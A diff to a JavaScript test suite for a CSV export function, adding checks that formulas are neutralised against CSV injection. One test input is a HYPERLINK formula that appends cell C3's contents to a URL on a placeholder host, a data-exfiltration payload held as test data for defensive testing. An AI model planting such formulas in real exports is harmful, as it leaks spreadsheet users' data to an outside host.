@@ -149,6 +149,11 @@ describe("CSV export", () => {
 
   it("escapes and adds a BOM", () => {
     expect(csvEscape('a;b "c"')).toBe('"a;b ""c"""');
+    // Formulas are neutralised (CSV injection); negative numbers stay numbers.
+    expect(csvEscape('=HYPERLINK("https://x.se?"&C3,"Anna")')).toBe(`"'=HYPERLINK(""https://x.se?""&C3,""Anna"")"`);
+    expect(csvEscape("@SUM(A1)")).toBe("'@SUM(A1)");
+    expect(csvEscape("-500")).toBe("'-500");
+    expect(csvEscape(-500)).toBe("-500");
     const csv = toCsv([["x", "y"]]);
     expect(csv.startsWith("﻿Bokningsnummer;")).toBe(true);
     expect(csv.endsWith("x;y\r\n")).toBe(true);
